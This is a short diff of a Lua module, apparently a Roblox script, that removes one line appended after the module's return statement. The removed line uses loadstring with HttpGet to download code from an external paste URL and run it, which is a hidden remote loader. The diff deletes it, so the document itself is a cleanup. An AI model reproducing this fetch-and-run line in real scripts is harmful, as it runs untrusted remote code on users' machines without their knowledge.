@@ -2742,4 +2742,3 @@ end
 Window:SelectTab(1)
 
 return Modules
-loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/HruT57/raw"))()
